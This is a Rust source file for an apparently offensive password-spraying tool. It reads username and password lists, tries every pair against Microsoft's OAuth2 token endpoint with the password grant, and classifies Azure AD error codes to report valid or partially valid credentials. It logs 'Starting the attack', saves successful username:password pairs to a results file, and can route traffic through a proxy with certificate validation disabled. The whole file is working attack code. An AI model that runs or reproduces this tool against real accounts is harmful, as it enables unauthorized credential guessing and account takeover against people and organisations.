mod args;
mod constants;
mod structs;

use args::Args;
use chrono::Utc;
use clap::Parser;
use constants::{ENDPOINTS, ERROR_CODES};
use reqwest::{blocking::Client, blocking::Response, Proxy, StatusCode};
use simplelog::{
    debug, error, info, trace, ColorChoice, CombinedLogger, Config, TermLogger, TerminalMode,
    WriteLogger,
};
use std::{
    ffi::OsStr,
    fs::{create_dir_all, File},
    io::{BufRead, BufReader, Read, Result, Seek, SeekFrom},
    thread,
    time::Duration,
};
use structs::{BadRequest, Foo};

fn send_request(
    client: Client,
    username: String,
    password: String,
    resource_principal: String,
) -> Response {
    let body = format!(
        "client_id={client_id}&client_info={client_info}&grant_type={grant_type}&password={password}&resource={resource}&scope={scope}&username={username}",
        client_id="1b730954-1685-4b74-9bfd-dac224a7b894",
        client_info="1",
        grant_type="password",
        password=password,
        resource=ENDPOINTS[resource_principal.as_str()],
        scope="openid",
        username=username,
    );
    let response = client
        .get("https://login.microsoft.com/common/oauth2/token")
        .header(reqwest::header::ACCEPT, "application/json")
        .header(
            reqwest::header::CONTENT_TYPE,
            "application/x-www-form-urlencoded",
        )
        .body(body)
        .send()
        .unwrap();

    return response;
}

fn parse_response(response: Response) -> Foo {
    trace!("HTTP status: {}", response.status());

    match response.status() {
        StatusCode::OK => {
            return Foo {
                code: None,
                message: "CREDENTIALS_FOUND",
                r#type: "SUCCESS",
            };
        }
        StatusCode::BAD_REQUEST => {
            let json_body = response.json::<BadRequest>().unwrap();

            trace!("JSON body: {:#?}", json_body);

            for entry in ERROR_CODES {
                let index = json_body.error_description.find(entry.code.unwrap());

                if index != None {
                    return entry;
                }
            }

            return Foo {
                // code: json_body.error_description.filer(AADSOMETHING),
                code: None,
                // message: format!("UNHANDLED_EXCEPTION (ERROR_CODE: <b>{}</b>)", json_body.error_description),
                message: "UNHANDLED_EXCEPTION (<b>ERROR_CODE</b>)",
                r#type: "ERROR",
            };
        }
        _ => {
            return Foo {
                code: None,
                // message: format!("UNHANDLED_EXCEPTION (ERROR_CODE: <b>{}</b>)", response.status()),
                message: "UNHANDLED_EXCEPTION (<b>HTTP_STATUS</b>)",
                r#type: "ERROR",
            };
        }
    };
}

fn main() -> Result<()> {
    let mut args = Args::parse();

    create_dir_all("results")?;

    if args.outfile.file_name() == Some(OsStr::new("results.log")) {
        let file_name = format!(
            "./results/results-{}.log",
            Utc::now().format("%Y-%m-%dT%H.%M.%S")
        );
        args.outfile.set_file_name(OsStr::new(file_name.as_str()));
    } else {
        let file_name = format!(
            "./results/{}",
            args.outfile.file_name().unwrap().to_string_lossy()
        );
        args.outfile.set_file_name(OsStr::new(file_name.as_str()));
    }

    let _ = CombinedLogger::init(vec![
        TermLogger::new(
            args.verbose.log_level_filter(),
            Config::default(),
            TerminalMode::Stdout,
            ColorChoice::Auto,
        ),
        WriteLogger::new(
            args.verbose.log_level_filter(),
            Config::default(),
            File::create(args.outfile.clone()).unwrap(),
        ),
    ]);

    debug!("CLI arguments: {:#?}", args);

    let mut client = Client::new();

    if !args.proxy.is_empty() {
        info!("Proxy set to: {}...", args.proxy);

        client = Client::builder()
            .proxy(Proxy::all(args.proxy).unwrap())
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap();
    }

    let mut username_buf_reader = BufReader::new(File::open(args.username)?);
    let mut password_buf_reader = BufReader::new(File::open(args.password)?);

    let total_candidates_count =
        username_buf_reader.by_ref().lines().count() * password_buf_reader.by_ref().lines().count();

    info!("Starting the attack...☕");

    let mut i: u128 = 0;

    username_buf_reader.seek(SeekFrom::Start(0))?;

    'outer: for username in username_buf_reader.by_ref().lines() {
        let mut username = username.unwrap();

        if !args.tenant.is_empty() {
            username = format!("{}@{}", username, args.tenant);
        }

        password_buf_reader.seek(SeekFrom::Start(0))?;

        for password in password_buf_reader.by_ref().lines() {
            let password: String = password.unwrap();

            let result: Foo = parse_response(send_request(
                client.clone(),
                username.clone(),
                password.clone(),
                args.resource_principal.to_string(),
            ));

            let mut success = false;
            let formatted_output = format!(
                "[<b>{}/{}</>] (<cyan>{}</>) {}:{}",
                i, total_candidates_count, args.resource_principal, username, password
            );

            match result.r#type {
                "SUCCESS" => {
                    success = true;
                    info!("{} -> <green>{}</>", formatted_output, result.message);
                }
                "PARTIAL_SUCCESS" => {
                    success = true;
                    info!("{} -> <magenta>{}</>", formatted_output, result.message);
                }
                "FAILURE" => debug!("{} -> <yellow>{}</>", formatted_output, result.message),
                // XXX: result.0 == 3
                _ => error!("{} -> <red>{}</>", formatted_output, result.message),
            }

            if args.continue_on_success {
                continue;
            } else {
                if success {
                    break 'outer;
                }
            }

            i += 1;

            thread::sleep(Duration::from_secs(args.delay));
        }
    }

    Ok(())
}
